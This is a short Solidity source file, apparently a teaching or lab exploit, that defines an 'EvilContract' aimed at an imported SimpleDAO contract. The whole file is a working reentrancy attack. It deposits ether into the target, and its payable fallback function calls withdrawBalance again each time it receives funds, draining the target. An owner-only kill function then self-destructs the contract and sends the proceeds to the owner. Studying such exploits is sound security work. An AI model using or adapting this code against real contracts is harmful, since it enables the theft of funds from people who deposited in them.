pragma solidity ^0.4.18;

import './SimpleDAO.sol';

contract EvilContract {

  SimpleDAO simpleDAO;
  address owner;

  function EvilContract(SimpleDAO _simpleDAO) public payable {
    simpleDAO = _simpleDAO;
    owner = msg.sender;
  }

  function addToSimpleDAO() public {
    simpleDAO.addToBalance.value(this.balance)();
  }

  function () public payable {
    uint256 evilContractBalance = simpleDAO.userBalances(this);
    if (simpleDAO.balance >= evilContractBalance) {
      simpleDAO.withdrawBalance();
    }
  }

  function kill() public {
    require(owner == msg.sender);
    selfdestruct(msg.sender);
  }
}
